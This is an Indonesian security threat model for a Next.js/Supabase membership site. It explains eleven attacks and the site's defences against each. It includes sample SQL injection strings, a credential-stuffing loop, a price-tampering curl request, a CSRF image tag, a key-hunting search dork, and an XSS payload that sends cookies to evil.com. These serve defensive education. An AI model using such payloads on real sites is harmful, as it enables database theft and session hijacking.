# Ancaman Cyber Security — profitdariai.com

> **Tujuan dokumen ini:** Edukasi pemilik website agar memahami bagaimana hacker bekerja,
> serangan apa yang relevan untuk platform ini, dan apa yang sudah/belum diproteksi.
>
> Semua contoh di bawah adalah skenario hipotetis untuk tujuan defensif.

---

## Cara Berpikir Hacker

Sebelum menyerang, hacker biasanya melakukan **reconnaissance** (pengintaian):

```
1. Cari informasi publik: domain, tech stack, error messages
2. Scan endpoint: /api/, /admin/, /.env, /config
3. Coba input tidak normal di form & URL
4. Cari celah di logika bisnis (bukan cuma teknis)
5. Eksploitasi temuan
```

Untuk profitdariai.com, seorang hacker akan langsung tahu stacknya dari response headers
dan behavior — Next.js, Supabase, Tripay.

---

## Serangan 1 — SQL Injection

### Apa itu?
Hacker menyisipkan kode SQL ke dalam input form/URL untuk memanipulasi database.
Misalnya: ketik `' OR '1'='1` di field password untuk bypass login.

### Contoh Serangan di Website Ini

**Target:** Form login, search member di admin, parameter URL.

```
# Hacker coba di field email login:
admin@profitdariai.com' OR '1'='1' --

# Atau di URL search:
/admin/members?q=' UNION SELECT id, email, role FROM profiles--
```

**Tujuan:** Bypass login, atau dump seluruh isi database (email, nama, data transaksi).

### Status Proteksi ✅ AMAN

Supabase menggunakan **parameterized queries** secara otomatis — input user tidak pernah
langsung digabung ke SQL string. Tidak ada raw SQL query di codebase ini.

```ts
// Yang dilakukan Supabase (aman):
supabase.from('profiles').select('*').eq('email', userInput)
// → SELECT * FROM profiles WHERE email = $1  ← input di-escape otomatis

// Yang TIDAK dilakukan (berbahaya):
db.query(`SELECT * FROM profiles WHERE email = '${userInput}'`)
```

### Yang Tetap Perlu Diperhatikan
- Jangan pernah gunakan raw Supabase RPC dengan string concatenation
- RLS di Supabase adalah layer proteksi kedua kalau query bocor

---

## Serangan 2 — Brute Force & Credential Stuffing

### Apa itu?
- **Brute force:** Coba ribuan kombinasi password sampai ketemu
- **Credential stuffing:** Pakai database email+password bocor dari website lain
  (banyak orang pakai password yang sama di banyak tempat)

### Contoh Serangan di Website Ini

```
# Hacker punya list 10 juta email+password dari breach database
# Jalankan script otomatis:

for each (email, password) in leaked_database:
    POST https://profitdariai.com/api/auth/login
    body: { email, password }
    
    if response == 200:
        print("FOUND:", email, password)
        # Akun berhasil dibobol — akses member gratis
```

**Tujuan:** Dapat akses member gratis tanpa bayar.

### Status Proteksi ⚠️ PARTIAL

✅ Supabase Auth punya built-in rate limiting  
❌ Tidak ada CAPTCHA di form login  
❌ Tidak ada notifikasi login dari device baru  
❌ Tidak ada lockout setelah N percobaan gagal di level app

### Rekomendasi
```
1. Aktifkan Supabase Auth → Rate Limits (sudah ada, pastikan aktif)
2. Tambah CAPTCHA (hCaptcha/Cloudflare Turnstile) di form login
3. Monitor login gagal berulang di Sentry
```

---

## Serangan 3 — Price Tampering (Manipulasi Harga)

### Apa itu?
Hacker memodifikasi request sebelum dikirim ke server untuk mengubah harga transaksi.
Ini salah satu serangan paling umum di e-commerce.

### Contoh Serangan di Website Ini

```
# Normal flow:
Browser → POST /api/payment/create → { amount: 199000 }

# Hacker pakai Burp Suite / DevTools intercept:
Browser → (INTERCEPT) → ubah amount → POST /api/payment/create → { amount: 1 }

# Atau: hacker kirim manual dengan curl:
curl -X POST https://profitdariai.com/api/payment/create \
  -H "Content-Type: application/json" \
  -d '{ "paymentMethod": "QRIS", "email": "hacker@gmail.com", 
         "fullName": "Hacker", "amount": 1 }'
```

### Status Proteksi ✅ AMAN

`/api/payment/create` tidak menerima `amount` dari client — harga di-hardcode di server:

```ts
// src/app/api/payment/create/route.ts
const amount = MEMBERSHIP_EARLY_BIRD_PRICE  // ← dari konstanta server, bukan dari request body
```

Dan di webhook, ada validasi tambahan:

```ts
// src/app/api/payment/webhook/route.ts
if (status === 'PAID' && payload.total_amount !== existing.amount) {
    return NextResponse.json({ error: 'Amount mismatch' }, { status: 400 })
}
```

Jadi bahkan kalau Tripay mengirim amount yang salah, membership tidak akan diaktifkan.

---

## Serangan 4 — Broken Access Control

### Apa itu?
User biasa mengakses resource yang harusnya hanya bisa diakses admin, atau user lain.
Ini serangan #1 di OWASP Top 10.

### Contoh Serangan di Website Ini

**Skenario A — Akses Admin Panel:**
```
# Hacker yang sudah punya akun member coba akses:
GET https://profitdariai.com/admin/dashboard
GET https://profitdariai.com/admin/members
```

**Skenario B — Download Ebook Tanpa Bayar:**
```
# Hacker daftar akun gratis (tanpa bayar), lalu coba:
GET https://profitdariai.com/api/ebook/download/[id]
```

**Skenario C — Akses Member Area Tanpa Login:**
```
GET https://profitdariai.com/dashboard
GET https://profitdariai.com/kursus
```

### Status Proteksi ✅ AMAN (berlapis)

**Layer 1 — Middleware (edge):**
```ts
// src/middleware.ts → src/proxy.ts
// Cek auth SEBELUM halaman di-render
if (isProtected && !user) redirect('/login')
if (pathname.startsWith('/admin') && role !== 'admin') redirect('/dashboard')
```

**Layer 2 — Page level:**
```ts
// Setiap member page juga cek auth sendiri
const { data: { user } } = await supabase.auth.getUser()
if (!user) redirect('/login')
```

**Layer 3 — API level:**
```ts
// /api/ebook/download
if (!user) return 401
if (!isMembershipActive(profile)) return 403
if (!ebook.is_published) return 404
```

**Layer 4 — Database level (RLS):**
```sql
-- User hanya bisa baca data miliknya sendiri
CREATE POLICY "Users can only read own profile"
ON profiles FOR SELECT
USING (auth.uid() = id);
```

---

## Serangan 5 — Webhook Replay Attack

### Apa itu?
Hacker merekam webhook pembayaran yang sah, lalu mengirimnya ulang berkali-kali
untuk mengaktifkan membership lebih dari sekali (atau untuk akun lain).

### Contoh Serangan di Website Ini

```
# Hacker sniff/intercept webhook Tripay yang valid:
POST /api/payment/webhook
{
  "reference": "T12345",
  "merchant_ref": "PDA-ABC123",
  "status": "PAID",
  "total_amount": 199000
}

# Kirim ulang payload yang sama 100x berharap membership di-extend
```

### Status Proteksi ✅ AMAN

**Signature verification:**
```ts
// Setiap webhook harus punya HMAC-SHA256 signature yang valid
// Digenerate dari TRIPAY_PRIVATE_KEY yang hanya kita dan Tripay tahu
if (!verifyWebhookSignature(rawBody, signature)) return 401
```

**Idempotency check:**
```ts
// Kalau status sudah sama, skip processing
if (existing.status === status) {
    return NextResponse.json({ success: true })  // return tapi tidak proses ulang
}
```

Replay attack tidak akan berhasil karena:
1. Signature tidak bisa dipalsukan tanpa private key
2. Kalau reference yang sama dikirim ulang, idempotency check mencegah double-processing

---

## Serangan 6 — XSS (Cross-Site Scripting)

### Apa itu?
Hacker menyisipkan JavaScript berbahaya ke halaman website. Ketika user lain
membuka halaman itu, script hacker berjalan di browser mereka — bisa curi cookie,
redirect ke phishing site, dll.

### Contoh Serangan di Website Ini

```
# Misal admin input nama kursus yang mengandung script:
Judul Kursus: <script>document.location='https://evil.com/?c='+document.cookie</script>

# Kalau tidak di-escape, semua member yang buka halaman kursus
# akan cookie-nya dicuri
```

### Status Proteksi ✅ AMAN

React secara default **escape semua output** — string dirender sebagai teks, bukan HTML.
Tidak ada penggunaan `dangerouslySetInnerHTML` di codebase ini.

```tsx
// React otomatis aman:
<h1>{courseTitle}</h1>  // ← "<script>" dirender sebagai teks literal, bukan dieksekusi

// Yang BERBAHAYA (tidak ada di codebase ini):
<div dangerouslySetInnerHTML={{ __html: courseTitle }} />
```

### Yang Tetap Perlu Diperhatikan
- Jangan pernah gunakan `dangerouslySetInnerHTML` dengan user input
- Kalau suatu saat pakai rich text editor di admin, wajib pakai sanitizer (DOMPurify)

---

## Serangan 7 — CSRF (Cross-Site Request Forgery)

### Apa itu?
Hacker membuat website jebakan yang diam-diam mengirim request ke website kamu
atas nama user yang sedang login. Misalnya: user buka evil.com, tanpa sadar
melakukan aksi di profitdariai.com.

### Contoh Serangan

```html
<!-- Di website hacker: -->
<img src="https://profitdariai.com/api/admin/delete-user?id=123" />
<!-- Browser user yang login akan otomatis kirim request ini dengan cookie mereka -->
```

### Status Proteksi ✅ AMAN

Next.js App Router + Supabase SSR menggunakan **cookie dengan `SameSite=Lax`** secara
default, yang mencegah browser mengirim cookie ke cross-site requests.

Server Actions Next.js juga punya CSRF protection bawaan.

---

## Serangan 8 — Phishing & Social Engineering

### Apa itu?
Bukan serangan teknis ke server — tapi menipu *manusia*.
Hacker pura-pura jadi admin profitdariai untuk dapat password atau data sensitif.

### Skenario yang Mungkin Terjadi

**Skenario A — Fake Support:**
```
WhatsApp dari nomor asing:
"Halo, saya tim support Profit dari AI. Ada masalah di akun kamu.
Tolong kirim email + password kamu agar bisa kami bantu."
```

**Skenario B — Fake Invoice:**
```
Email dari: noreply@profitdariai-support.com (domain palsu!)
"Pembayaran kamu gagal. Klik link ini untuk konfirmasi ulang."
[Link ke halaman phishing yang mirip website asli]
```

**Skenario C — Fake Refund:**
```
"Kami ada program refund spesial. Kirim data rekening kamu untuk proses."
```

### Cara Mitigasi (Non-teknis)

1. **Tetapkan aturan jelas di FAQ:** "Kami TIDAK PERNAH minta password via WhatsApp/email"
2. **Gunakan domain email resmi:** `admin@profitdariai.com` — bukan Gmail
3. **Edukasi member:** Selalu cek URL sebelum login, pastikan ada `https://profitdariai.com`
4. **Aktifkan 2FA di akun admin** (Supabase dashboard, GitHub, domain registrar)

---

## Serangan 9 — Enumeration (Intelijen Data)

### Apa itu?
Hacker mencari informasi dengan coba-coba — bukan langsung menyerang, tapi
mengumpulkan data yang berguna untuk serangan berikutnya.

### Contoh di Website Ini

**Email enumeration:**
```
# Hacker coba masuk dengan email random, lihat response:
POST /api/auth/login  { email: "coba@gmail.com", password: "xxx" }
→ "Email tidak ditemukan"        ← BERBAHAYA: konfirmasi email tidak ada

POST /api/auth/login  { email: "admin@profitdariai.com", password: "xxx" }
→ "Password salah"               ← BERBAHAYA: konfirmasi email ADA
```

Dengan ini hacker bisa verify apakah suatu email terdaftar, lalu gunakan
untuk credential stuffing atau phishing yang lebih targeted.

**User ID enumeration:**
```
# Coba akses ebook dengan ID berurutan:
GET /api/ebook/download/1
GET /api/ebook/download/2
GET /api/ebook/download/3
```

### Status Proteksi

⚠️ **Email enumeration:** Supabase Auth secara default membedakan response "email tidak ada"
vs "password salah". Ini hard to fix tanpa custom auth flow.

✅ **Resource ID:** Ebook pakai UUID (bukan angka berurutan), hampir tidak mungkin di-guess.

### Rekomendasi
Di Supabase dashboard → Authentication → Settings → aktifkan
**"Protect against email enumeration"** (jika tersedia di plan kamu).

---

## Serangan 10 — DDoS (Distributed Denial of Service)

### Apa itu?
Ribuan komputer (botnet) serentak mengirim request ke server sampai server
overload dan tidak bisa melayani user asli.

### Skenario di Website Ini

```
# Hacker punya botnet 10.000 komputer:
for each bot in botnet:
    while True:
        GET https://profitdariai.com/
        POST https://profitdariai.com/api/payment/create
```

Server overload → website down → kehilangan penjualan + reputasi.

### Status Proteksi ⚠️ PARTIAL

**Di Vercel (sekarang):**
✅ Vercel Edge Network punya DDoS protection bawaan — cukup untuk skala kecil-menengah  
✅ Rate limiting otomatis di Vercel Edge

**Kalau pindah ke VPS:**
❌ Tidak ada proteksi DDoS bawaan  
✅ **Solusi:** Pasang Cloudflare (free plan) sebagai proxy sebelum VPS

### Rekomendasi untuk VPS
```
VPS Migration → wajib pasang Cloudflare:
profitdariai.com → Cloudflare (filter DDoS) → IP VPS

Cloudflare free plan sudah sangat cukup:
- DDoS protection
- WAF (Web Application Firewall) dasar
- Rate limiting
- Bot protection
```

---

## Serangan 11 — Environment Variable Leak

### Apa itu?
Kunci rahasia (API keys, database password) tidak sengaja terpublish — biasanya
karena di-commit ke GitHub atau ter-expose lewat error message.

### Skenario Berbahaya

```bash
# Hacker cari di GitHub:
site:github.com "SUPABASE_SERVICE_ROLE_KEY" "profitdariai"

# Atau akses endpoint yang bocorkan env:
GET https://profitdariai.com/api/debug  ← kalau ada endpoint debug yang lupa dihapus

# Atau dari error message:
Error: Cannot connect to postgresql://postgres:PASSWORD@db.supabase.co
```

Kalau `SUPABASE_SERVICE_ROLE_KEY` bocor → hacker punya akses penuh ke database,
bypass semua RLS, bisa baca/hapus semua data.

### Status Proteksi ✅ AMAN

✅ `.env.local` ada di `.gitignore`  
✅ Semua `NEXT_PUBLIC_` hanya untuk data yang memang boleh publik  
✅ `SUPABASE_SERVICE_ROLE_KEY` hanya dipakai di server-side (`admin.ts`)  
✅ Tidak ada debug endpoint  

### Yang Harus Selalu Dijaga
- **Jangan pernah** commit `.env` atau `.env.local` ke GitHub
- Rotate (ganti) semua API keys kalau curiga ada yang bocor
- Audit GitHub repo secara berkala: tidak ada hardcoded secret

---

## Ringkasan Status Keamanan

| Ancaman | Severity | Status |
|---|---|---|
| SQL Injection | 🔴 Kritis | ✅ Aman (Supabase parameterized query) |
| Brute Force / Credential Stuffing | 🔴 Kritis | ⚠️ Partial (rate limit Supabase, belum CAPTCHA) |
| Price Tampering | 🔴 Kritis | ✅ Aman (amount di-hardcode server) |
| Broken Access Control | 🔴 Kritis | ✅ Aman (middleware + page + API + RLS) |
| Webhook Replay | 🟡 Tinggi | ✅ Aman (signature + idempotency) |
| XSS | 🟡 Tinggi | ✅ Aman (React escape otomatis) |
| CSRF | 🟡 Tinggi | ✅ Aman (SameSite cookie) |
| Phishing / Social Engineering | 🟡 Tinggi | ⚠️ Perlu edukasi member |
| Email Enumeration | 🟠 Sedang | ⚠️ Default Supabase behavior |
| DDoS | 🟠 Sedang | ⚠️ Aman di Vercel, perlu Cloudflare kalau VPS |
| Env Variable Leak | 🔴 Kritis | ✅ Aman (gitignore + server-only) |

---

## Action Items

### Sekarang (sebelum launch)
- [ ] Aktifkan **"Protect against email enumeration"** di Supabase Auth settings
- [ ] Aktifkan **2FA** di semua akun admin: Supabase dashboard, GitHub, domain registrar
- [ ] Cek Supabase Auth Rate Limits sudah aktif
- [ ] Tambahkan di FAQ/kontak: "Kami tidak pernah minta password"

### Saat Migrasi ke VPS
- [ ] Pasang **Cloudflare** sebagai proxy (free plan cukup) sebelum VPS IP diexpose
- [ ] Aktifkan Cloudflare WAF basic rules
- [ ] Pertimbangkan tambah **hCaptcha** di form login

### Jangka Panjang
- [ ] Setup **Supabase Logs** alert untuk login gagal berulang
- [ ] Review semua RLS policies setiap kali tambah tabel baru
- [ ] Lakukan security review setiap 3 bulan

---

## Glossary (Kamus Istilah)

| Istilah | Artinya |
|---|---|
| **Hacker** | Orang yang mencari dan mengeksploitasi celah keamanan |
| **RLS** | Row Level Security — aturan di database siapa boleh akses data apa |
| **OWASP** | Organisasi yang mendokumentasikan 10 kerentanan web paling umum |
| **SQL Injection** | Menyisipkan kode SQL ke input untuk manipulasi database |
| **XSS** | Menyisipkan JavaScript jahat ke halaman web |
| **CSRF** | Memalsukan request atas nama user yang sedang login |
| **DDoS** | Membanjiri server dengan traffic sampai down |
| **Rate Limiting** | Membatasi berapa banyak request per detik dari satu IP |
| **2FA** | Two-Factor Authentication — login perlu 2 verifikasi |
| **WAF** | Web Application Firewall — filter traffic berbahaya sebelum sampai server |
| **HMAC** | Metode cryptographic untuk verifikasi keaslian pesan (dipakai di webhook) |
| **Parameterized Query** | Cara aman query database tanpa risiko SQL injection |
| **Idempotency** | Sifat operasi yang aman dijalankan berkali-kali tanpa efek ganda |
| **Reconnaissance** | Fase pengintaian — hacker kumpulkan info sebelum menyerang |
